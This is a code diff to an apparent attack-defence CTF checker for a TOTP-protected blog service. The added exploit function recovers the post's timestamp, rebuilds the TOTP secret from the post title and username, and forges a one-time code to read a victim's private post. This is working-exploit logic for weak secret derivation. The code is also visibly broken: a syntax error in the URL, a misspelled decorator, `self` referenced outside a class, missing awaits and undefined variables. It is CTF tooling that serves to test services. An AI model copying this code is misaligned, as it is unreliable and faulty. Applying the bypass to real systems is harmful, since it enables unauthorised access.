@@ -8,6 +8,8 @@ from itertools import zip_longest
 from logging import LoggerAdapter
 from typing import List, Optional, Tuple
 from bs4 import BeautifulSoup
+from datetime import timezone
+import datetime
 
 from enochecker3 import (
     ChainDB,
@@ -46,7 +48,7 @@ class Totp_Client:
     def generate_shared_secret(self, secret: str=""):
         if not secret:
             if not self.secret_key:
-                self.secret_phrase = "Hier könnte ihr Geheimnis stehen"
+                secret_phrase = "Hier könnte Ihr Geheimnis stehen!"
                 secret_key_tmp = hashlib.sha256(self.secret_phrase.encode())
                 self.secret_key = secret_key_tmp.digest()
         else:
@@ -103,13 +105,13 @@ async def login_user(task, client, username, password):
     assert_equals(r.status_code, 302, "Login Error in login_user function.")
     return r.cookies
 
-async def create_blogpost(cookies, flag):
+async def create_blogpost(cookie, flag):
     title = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
     body = flag
     private = "True"
     formdata = {"title": title, "body": body, "private": private}
     url =  "http://" + task.address + ':' + str(SERVICE_PORT)} + "/create"
-    r = await client.post(url, json=formdata, cookies=cookies)
+    r = await client.post(url, json=formdata, cookies=cookie)
 
     html = BeautifulSoup(r.text, "html.parser")
     article = html.find('article', attrs={"class":"post"})
@@ -135,8 +137,8 @@ async def putflag_zero(
     """
     flag = task.flag
     username, password, secret = register_user(task, client)
-    cookies = login_user(task, client, username, password)
-    title, postid = create_blogpost(cookies, flag)
+    cookie = login_user(task, client, username, password)
+    title, postid = create_blogpost(cookie, flag)
 
     await db.set("nec_info", (username, password, secret, title, postid))
     attackinfo = {"title": title, "postid": postid}
@@ -183,6 +185,16 @@ def find_params(r, username, postid):
                 continue
     raise MumbleException("post could not be found")
 
+def convert_str_to_unixtimestamp(timestr: str):
+    date, timec = timestr.split(' ', 1)
+    datecomp=date.split('-')
+    timec = timec.split('.', 1)[0]
+    timecomp=timec.split(':')
+    #create new aware datetime object from date and time components
+    dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), int(timecomp[2]), tzinfo=timezone.utc)
+    print("returning")
+    return dto.timestamp()
+
 @checker.explpoit(0)
 async def exploit_zero(task: ExploitCheckerTaskMessage,
                        searcher: FlagSearcher,
@@ -204,11 +216,21 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
     postid = attackinfo['postid']
 
     username, password, secret = register_user(task, client)
-    cookies = login_user(task, client, username, password)
+    cookie = login_user(task, client, username, password)
 
     url = "http://" + task.address + str(SERVICE_PORT) + "/"
     r = await client.get(url, cookies=cookie)
 
     time = find_params(r, username, postid)
+    timestamp = convert_str_to_unixtimestamp(time)
+    postkey = title + username
+    totp_device = Totp_Client(init_time=timestamp)
+    totp_device.generate_shared_secret(postkey)
+    totp_device.calculate_current_timestep_count()
+    usercode = totp_device.generate_otp(self.secret_key, self.timestep_counter)
 
+    url = url + "auth/accessblogpost/postid"
+    r = await client.post(url, json={"code":usercode}, cookies=cookie)
+    assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
+    assert_in(task.flag, r.text, "flag was not found in blogpost")
     return
